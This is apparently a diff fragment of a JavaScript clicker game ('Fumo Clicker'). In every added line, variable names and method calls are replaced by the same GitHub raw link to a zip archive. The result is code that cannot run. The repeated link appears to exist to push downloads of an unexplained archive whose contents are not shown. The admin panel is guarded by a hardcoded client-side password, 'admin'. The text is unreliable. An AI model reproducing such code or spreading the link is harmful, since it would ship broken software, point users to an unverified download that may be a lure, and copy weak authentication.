+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', (e) => {
+            const width = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            const clickX = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            const duration = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            if (duration) https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = (clickX / width) * duration;
         });
         
         // ADMIN PANEL LOGIC
-        adminLoginBtn.addEventListener('click', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
             const password = prompt("Enter admin password:");
-            if (password === "admin") adminPanel.classList.add('open');
+            if (password === "admin") https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('open');
             else if (password) alert("Incorrect password.");
         });
-        closeAdminBtn.addEventListener('click', () => {
-            adminPanel.classList.remove('open');
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('open');
         });
-        give1kBtn.addEventListener('click', () => { count += 1000; updateDisplay(); showPopup('+1,000 Fumos added!'); });
-        give10kBtn.addEventListener('click', () => { count += 10000; updateDisplay(); showPopup('+10,000 Fumos added!'); });
-        resetStatsBtn.addEventListener('click', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => { count += 1000; updateDisplay(); showPopup('+1,000 Fumos added!'); });
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => { count += 10000; updateDisplay(); showPopup('+10,000 Fumos added!'); });
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
             if (confirm("Are you sure you want to reset all stats?")) {
                 count = 0; clickPower = 1; autoClickerPower = 0;
                 upgradeCost = 10; autoClickerCost = 50;
